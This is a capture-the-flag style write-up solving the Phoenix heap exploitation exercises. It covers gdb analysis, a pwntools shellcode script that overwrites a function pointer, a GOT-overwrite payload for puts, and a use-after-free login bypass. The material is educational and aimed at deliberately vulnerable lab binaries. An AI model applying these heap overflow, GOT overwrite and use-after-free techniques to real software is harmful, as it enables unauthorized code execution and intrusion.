# Heap

There is multiple way of controlling the flow of a program, by overriding some part of the memory. In this section we will focus on heap memory overflow.

By example, you can override the content of the heap, to override variable or the GOT.

To got further, you have to understand the structure on how malloc manage the heap allocation: https://sourceware.org/glibc/wiki/MallocInternals

For those examples, you will need to install Phoenix: https://exploit.education/phoenix/getting-started/

## Heap Zero

### Exercise

Description: https://exploit.education/phoenix/heap-zero/

### Solution

We need to know where the function `winner` is implemented: `0x400abd`

```
$ gdb -batch -ex 'file /opt/phoenix/amd64/heap-zero' -ex 'disassemble winner'
Dump of assembler code for function winner:
   0x0000000000400abd <+0>:     push   %rbp
...
```

The function pointer gets overrided by `NNNNOOO`:
```
$ ./heap-zero AAAAAABBBBBBCCCCCCDDDDDDEEEEEEFFFFFFGGGGGGHHHHHHIIIIIIJJJJJJKKKKKKLLLLLLMMMMMMNNNNNNOOOOOOOO
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0x7ffff7ef5010, fp is at 0x7ffff7ef5060, will be calling 0x4f4f4f4f4e4e4e4e
Segmentation fault (core dumped)
```

> Sadly, the 64bit version of this challenge, is more complicated, as addresses contain null byte, preventing strcpy to proceed with our redirection.

To overcome this issue, we will inject a small binary shellcode, in our buffer, that jump to the correct address:

```asm
push 0x1010101 ^ 0x400abd
xor dword ptr [rsp], 0x1010101
ret
```

We need to override the pointer address to the begining of our data buffer, where our shellcode is injected:

```py
# You need to install pwntools, to import pwnlib
import pwnlib
import struct

BUFFER = 0x7ffff7ef5010
WINNER = 0x400abd

pwnlib.context.arch = 'amd64'
shellcode = pwnlib.shellcraft.amd64.push(WINNER)
shellcode += pwnlib.shellcraft.amd64.ret()

shellcode = pwnlib.asm.asm(shellcode, arch='amd64')

buf = shellcode + b"." * (80 - len(shellcode))
buf += struct.pack("<Q", BUFFER)

print(buf)
```

We send the payload to our command line:
```
./heap-zero `python ~/heap-zero.py`
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0x7ffff7ef5010, fp is at 0x7ffff7ef5060, will be calling 0x7ffff7ef5010
Congratulations, you have passed this level
```

## Heap One

### Exercise

Description: https://exploit.education/phoenix/heap-one/

### Solution

> For this exploit, we will operate on the x86 version of the binary due to limitation we encounter on writing null bytes through strcpy.

```
$ gdb ./heap-one
(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO 0000
Starting program: /opt/phoenix/amd64/heap-one AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO 0000

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7d85c06 in stpcpy () from /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1
(gdb) x/2wx $esp
0xffffd524:     0xf7ffb000      0x46464646
```
We notice that the program, tries to write `argv[2]` at `0x46464646` (`FFFF`)).
If we could override the GOT (for the `puts` call), with an address we control, we could redirect the control flow.

```
(gdb) disassemble main
Dump of assembler code for function main:
...
   0x08048883 <+174>:   call   0x80485b0 <puts@plt>
...
(gdb) disassemble 0x80485b0
Dump of assembler code for function puts@plt:
   0x080485b0 <+0>:     jmp    DWORD PTR ds:0x804c140
   0x080485b6 <+6>:     push   0x28
   0x080485bb <+11>:    jmp    0x8048550
End of assembler dump.
(gdb) disassemble winner
Dump of assembler code for function winner:
   0x0804889a <+0>:     push   ebp
...
End of assembler dump.
```

It seems `i2->name` could be assigned to `0x804c140` (GOT entry, for `puts`), so that the next puts call, will redirect it to the winner function (`0x0804889a`).

Let's give it a try:

```sh
$ ./heap-one $(echo -e "AAAABBBBCCCCDDDDEEEE\x40\xc1\x04\x08") $(echo -e "\x9a\x88\x04\x08")
Congratulations, you've completed this level @ 1592169438 seconds past the Epoch
```

## Heap Two

### Exercise

Description: https://exploit.education/phoenix/heap-two/

### Solution

This challenge, rely on the fact that a memory segment, that was free-ed, is not dereferenced, and can still be accessible.
After executing the `reset` command: `auth->auth` is still pointed in memory at the adress: `0x600e40 + 0x20`.
By realocating memory (on the same place, using the `service` command, you override the content of `auth->auth`)
If you execute `login`, you get connected, because the service name get's written on that memory segment.

```
ange@paradize:/opt/phoenix/i486$ ./heap-two
$ ./heap-two
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth .
[ auth = 0x600e40, service = 0 ]
reset
[ auth = 0x600e40, service = 0 ]
service .
[ auth = 0x600e40, service = 0x600e40 ]
login
you have logged in already!
[ auth = 0x600e40, service = 0x600e40 ]
```

## Heap Three

### Exercise

Description: https://exploit.education/phoenix/heap-three/

### Solution

The solution is well described in Lucas Bader's blog, I highly encourage you to read it: https://www.lucas-bader.com/ctf/2019/05/02/heap3
